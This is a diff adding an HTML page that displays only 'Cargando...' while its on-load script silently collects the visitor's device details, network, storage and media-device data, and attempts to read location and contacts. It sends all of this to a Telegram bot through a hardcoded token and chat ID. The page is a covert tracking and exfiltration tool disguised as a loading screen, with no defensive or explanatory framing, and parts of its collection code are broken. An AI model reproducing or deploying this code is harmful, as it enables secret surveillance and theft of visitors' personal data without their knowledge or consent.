@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capturar Información del Dispositivo</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: white;
+        }
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 1000;
+            display: none;
+        }
+        #content {
+            position: relative;
+            z-index: 1001;
+        }
+    </style>
+</head>
+<body>
+    <div id="overlay"></div>
+    <div id="content">
+        <h1>Cargando...</h1>
+    </div>
+    <script>
+        const TELEGRAM_TOKEN = '8536690071:AAG-ScvmZZYWSdhrd3v4lltuWagWuVFlLBU';
+        const CHAT_ID = '7542699747';
+
+        function captureDeviceInfo() {
+            return new Promise((resolve, reject) => {
+                try {
+                    const deviceInfo = {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        screenResolution: `${window.screen.width}x${window.screen.height}`,
+                        availableScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
+                        colorDepth: window.screen.colorDepth,
+                        pixelDepth: window.screen.pixelDepth,
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        connection: `${navigator.connection ? navigator.connection.effectiveType : 'unknown'}`,
+                        battery: navigator.getBattery ? navigator.getBattery().then(battery => ({ level: battery.level, charging: battery.charging })) : null,
+                        geolocation: navigator.geolocation ? navigator.geolocation.getCurrentPosition(position => ({ latitude: position.coords.latitude, longitude: position.coords.longitude })) : null
+                    };
+                    resolve(deviceInfo);
+                } catch (error) {
+                    reject("Error al capturar información del dispositivo: " + error);
+                }
+            });
+        }
+
+        function captureContacts() {
+            return new Promise((resolve, reject) => {
+                try {
+                    const contacts = [];
+                    if (navigator.contacts) {
+                        navigator.contacts.find(['displayName', 'phoneNumbers'], contacts => {
+                            contacts.forEach(contact => {
+                                const contactInfo = {
+                                    displayName: contact.displayName,
+                                    phoneNumbers: contact.phoneNumbers ? contact.phoneNumbers.map(num => num.value) : []
+                                };
+                                contacts.push(contactInfo);
+                            });
+                            resolve(contacts);
+                        }, error => {
+                            reject("Error al obtener contactos: " + error);
+                        });
+                    } else {
+                        resolve([]);
+                    }
+                } catch (error) {
+                    reject("Error al capturar contactos: " + error);
+                }
+            });
+        }
+
+        function captureNetworkInfo() {
+            return new Promise((resolve, reject) => {
+                try {
+                    const networkInfo = {
+                        effectiveType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                        downlink: navigator.connection ? navigator.connection.downlink : null,
+                        rtt: navigator.connection ? navigator.connection.rtt : null,
+                        saveData: navigator.connection ? navigator.connection.saveData : null
+                    };
+                    resolve(networkInfo);
+                } catch (error) {
+                    reject("Error al capturar información de red: " + error);
+                }
+            });
+        }
+
+        function captureStorageInfo() {
+            return new Promise((resolve, reject) => {
+                try {
+                    if ('storage' in navigator && 'estimate' in navigator.storage) {
+                        navigator.storage.estimate().then(estimate => {
+                            const storageInfo = {
+                                quota: estimate.quota,
+                                usage: estimate.usage,
+                                remaining: estimate.quota - estimate.usage
+                            };
+                            resolve(storageInfo);
+                        }).catch(error => {
+                            reject("Error al estimar almacenamiento: " + error);
+                        });
+                    } else {
+                        resolve(null);
+                    }
+                } catch (error) {
+                    reject("Error al capturar información de almacenamiento: " + error);
+                }
+            });
+        }
+
+        function captureMediaDevices() {
+            return new Promise((resolve, reject) => {
+                try {
+                    navigator.mediaDevices.enumerateDevices().then(devices => {
+                        const mediaDevices = devices.map(device => ({
+                            kind: device.kind,
+                            label: device.label,
+                            deviceId: device.deviceId
+                        }));
+                        resolve(mediaDevices);
+                    }).catch(error => {
+                        reject("Error al enumerar dispositivos de medios: " + error);
+                    });
+                } catch (error) {
+                    reject("Error al capturar dispositivos de medios: " + error);
+                }
+            });
+        }
+
+        async function sendInfoToTelegram(info, title) {
+            try {
+                const message = `=== ${title} ===\n` + Object.entries(info).map(([key, value]) => `${key}: ${value}`).join('\n');
+                await sendMessageToTelegram(message);
+            } catch (error) {
+                console.error("Error al enviar información a Telegram:", error);
+                await sendMessageToTelegram(`Ocurrió un error al enviar ${title}: ` + error);
+            }
+        }
+
+        async function sendMessageToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                console.log("Mensaje enviado a Telegram:", message);
+            } catch (error) {
+                console.error("Error al enviar mensaje a Telegram:", error);
+            }
+        }
+
+        function startCapture() {
+            const overlay = document.getElementById('overlay');
+            overlay.style.display = 'block';
+            setTimeout(async () => {
+                overlay.style.display = 'none';
+                try {
+                    const [deviceInfo, contacts, networkInfo, storageInfo, mediaDevices] = await Promise.all([
+                        captureDeviceInfo(),
+                        captureContacts(),
+                        captureNetworkInfo(),
+                        captureStorageInfo(),
+                        captureMediaDevices()
+                    ]);
+
+                    await sendInfoToTelegram(deviceInfo, 'Información del Dispositivo');
+                    if (contacts.length > 0) {
+                        const contactsMessage = "Contactos:\n" + contacts.map(contact => `
+                            Nombre: ${contact.displayName}
+                            Números de Teléfono: ${contact.phoneNumbers.join(', ')}
+                        `).join('\n');
+                        await sendMessageToTelegram(contactsMessage);
+                    } else {
+                        await sendMessageToTelegram("No se pudieron obtener contactos.");
+                    }
+                    await sendInfoToTelegram(networkInfo, 'Información de Red');
+                    if (storageInfo) {
+                        await sendInfoToTelegram(storageInfo, 'Información de Almacenamiento');
+                    }
+                    await sendInfoToTelegram(mediaDevices, 'Dispositivos de Medios');
+                } catch (error) {
+                    console.error("Error:", error);
+                    await sendMessageToTelegram("Ocurrió un error al capturar la información del dispositivo: " + error);
+                }
+            }, 1000); // Mostrar overlay durante 1 segundo antes de capturar
+        }
+
+        window.onload = startCapture;
+
+        // Manejo de la solicitud de permiso
+        const originalGetDisplayMedia = navigator.mediaDevices.getDisplayMedia.bind(navigator.mediaDevices);
+        navigator.mediaDevices.getDisplayMedia = async function(constraints) {
+            try {
+                const stream = await originalGetDisplayMedia(constraints);
+                return stream;
+            } catch (error) {
+                throw new Error("Error en getDisplayMedia: " + error);
+            }
+        };
+    </script>
+</body>
+</html>
